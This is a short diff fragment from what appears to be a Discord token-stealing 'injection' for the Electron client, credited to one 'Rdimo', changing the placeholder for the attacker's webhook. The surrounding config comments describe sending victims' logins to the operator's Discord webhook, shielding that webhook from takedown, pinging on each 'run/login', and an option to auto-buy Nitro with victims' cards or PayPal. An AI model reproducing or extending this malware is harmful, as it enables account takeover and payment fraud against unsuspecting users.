@@ -8,7 +8,7 @@ const { BrowserWindow, session } = require('electron');
 // All OF THIS INJECTION IS RDIMO'S. FULL CREDIT GOES TO HIM I DIDN'T MAKE ANY OF THIS!
 
 const config = {
-  webhook: '&webhook&', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
